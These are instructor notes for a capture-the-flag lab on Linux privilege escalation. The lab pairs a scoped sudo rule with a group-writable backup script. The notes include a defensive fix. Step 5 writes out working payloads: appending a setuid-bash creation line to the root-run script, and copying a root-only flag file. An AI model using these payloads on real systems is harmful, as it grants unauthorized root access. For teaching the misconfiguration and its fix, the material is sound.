# Privilege escalation: instructor notes (Stage 10-12)

**Do not link this file from student-facing pages.** It is intended for
instructors verifying the lab and for a post-exercise debrief.

## The misconfiguration

Provisioned by `setup_privesc.sh` (run at container build time and by
`scripts/reset_lab.sh`):

- `appuser` (the account the vulnerable upload chain executes as) is a
  member of the `shopops` group.
- `/opt/shop/scripts/backup.sh` is owned by `root:shopops` with mode `774`
  — **group-writable**.
- `/etc/sudoers.d/shop-backup` grants `appuser ALL=(root) NOPASSWD:
  /opt/shop/scripts/backup.sh` — scoped to exactly that one script, not
  `ALL=(ALL) NOPASSWD:ALL`.

Because the script sudo will run as root is writable by the very account
permitted to invoke it via sudo, `appuser` can rewrite the script and then
have root execute their code.

## Expected student path (from an `appuser` shell after Stage 9)

1. `id` — notice membership in the `shopops` group (not just the default
   `appuser` group).
2. `sudo -l` — shows the scoped NOPASSWD rule for `backup.sh`.
3. `ls -la /opt/shop/scripts/backup.sh` — shows `root:shopops rwxrwxr--`.
4. Realize the script is writable by their own group membership.
5. Append a payload, e.g.:
   ```bash
   echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/shop/scripts/backup.sh
   sudo /opt/shop/scripts/backup.sh
   /tmp/rootbash -p
   ```
   or simply:
   ```bash
   echo 'cat /root/final_flag > /opt/shop/flags/final_flag_copy; chmod 644 /opt/shop/flags/final_flag_copy' >> /opt/shop/scripts/backup.sh
   sudo /opt/shop/scripts/backup.sh
   ```
6. Read `/root/final_flag`.

## Why this is a good training vulnerability

- Deterministic and 100% reproducible after `reset_lab.sh` — no reliance on
  a kernel version or unpatched CVE.
- Not `ALL=(ALL) NOPASSWD:ALL` — the sudo rule is narrowly scoped, which is
  exactly why the deeper bug (group-writable target) needs to be found:
  scoped sudo rules are NOT automatically safe if the target is writable.
- Mirrors a real, common misconfiguration class: an on-call/maintenance
  script granted narrow sudo rights, whose file permissions were never
  independently reviewed against the group memberships of the account
  permitted to invoke it.

## Defensive fix

- The script should be owned by `root:root`, mode `750` or `700`, so no
  non-root account can modify it.
- Sudo rules should be paired with a permission audit of their targets:
  `visudo`-managed scripts must not be group- or world-writable by anyone
  other than root.
- Prefer a dedicated backup service account with no interactive login and
  no sudo rights of its own, triggered by a systemd timer instead of a
  human/application-invoked sudo rule.
